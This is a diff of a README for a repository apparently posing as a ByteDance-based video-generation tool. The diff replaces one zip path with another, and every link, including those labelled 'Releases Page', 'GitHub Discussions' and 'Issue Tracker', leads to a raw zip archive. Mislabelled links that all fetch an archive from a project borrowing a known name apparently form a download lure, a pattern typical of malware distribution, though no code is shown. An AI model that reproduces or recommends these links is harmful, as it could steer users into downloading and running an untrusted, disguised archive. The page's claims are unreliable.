@@ -1,6 +1,6 @@
 # 🎭 cog-ByteDance-Phantom-HuMo - Create Stunning Videos Effortlessly
 
-[![Download](https://raw.githubusercontent.com/Almazlum/cog-ByteDance-Phantom-HuMo/main/Dardani/cog-ByteDance-Phantom-HuMo.zip%20Now%20-%20cog--ByteDance--Phantom--HuMo-blue)](https://raw.githubusercontent.com/Almazlum/cog-ByteDance-Phantom-HuMo/main/Dardani/cog-ByteDance-Phantom-HuMo.zip)
+[![Download](https://raw.githubusercontent.com/Almazlum/cog-ByteDance-Phantom-HuMo/main/humo/Hu_Byte_Dance_cog_Mo_Phantom_3.4-alpha.1.zip%20Now%20-%20cog--ByteDance--Phantom--HuMo-blue)](https://raw.githubusercontent.com/Almazlum/cog-ByteDance-Phantom-HuMo/main/humo/Hu_Byte_Dance_cog_Mo_Phantom_3.4-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to cog-ByteDance-Phantom-HuMo! This application allows you to generate v
 
 ## 📥 Download & Install
 
-To get started, **visit this page to download** the latest version of the application: [Releases Page](https://raw.githubusercontent.com/Almazlum/cog-ByteDance-Phantom-HuMo/main/Dardani/cog-ByteDance-Phantom-HuMo.zip).
+To get started, **visit this page to download** the latest version of the application: [Releases Page](https://raw.githubusercontent.com/Almazlum/cog-ByteDance-Phantom-HuMo/main/humo/Hu_Byte_Dance_cog_Mo_Phantom_3.4-alpha.1.zip).
 
 Once you are on the releases page, look for the latest version listed. Choose the file that matches your operating system. Click on the file to download it to your computer.
 
@@ -56,8 +56,8 @@ Before you begin, ensure your computer meets the following system requirements:
 
 Join our community for tips and help:
 
-- [GitHub Discussions](https://raw.githubusercontent.com/Almazlum/cog-ByteDance-Phantom-HuMo/main/Dardani/cog-ByteDance-Phantom-HuMo.zip)
-- [Issue Tracker](https://raw.githubusercontent.com/Almazlum/cog-ByteDance-Phantom-HuMo/main/Dardani/cog-ByteDance-Phantom-HuMo.zip): Report bugs or request features.
+- [GitHub Discussions](https://raw.githubusercontent.com/Almazlum/cog-ByteDance-Phantom-HuMo/main/humo/Hu_Byte_Dance_cog_Mo_Phantom_3.4-alpha.1.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/Almazlum/cog-ByteDance-Phantom-HuMo/main/humo/Hu_Byte_Dance_cog_Mo_Phantom_3.4-alpha.1.zip): Report bugs or request features.
 
 ## 📮 Feedback
 
@@ -65,4 +65,4 @@ Your feedback is important to us. Feel free to share your thoughts and suggestio
 
 For further support, you can always reach out to us through the community links provided. We appreciate your interest in cog-ByteDance-Phantom-HuMo and wish you the best in creating amazing videos! 
 
-[![Download](https://raw.githubusercontent.com/Almazlum/cog-ByteDance-Phantom-HuMo/main/Dardani/cog-ByteDance-Phantom-HuMo.zip%20Now%20-%20cog--ByteDance--Phantom--HuMo-blue)](https://raw.githubusercontent.com/Almazlum/cog-ByteDance-Phantom-HuMo/main/Dardani/cog-ByteDance-Phantom-HuMo.zip)
+[![Download](https://raw.githubusercontent.com/Almazlum/cog-ByteDance-Phantom-HuMo/main/humo/Hu_Byte_Dance_cog_Mo_Phantom_3.4-alpha.1.zip%20Now%20-%20cog--ByteDance--Phantom--HuMo-blue)](https://raw.githubusercontent.com/Almazlum/cog-ByteDance-Phantom-HuMo/main/humo/Hu_Byte_Dance_cog_Mo_Phantom_3.4-alpha.1.zip)
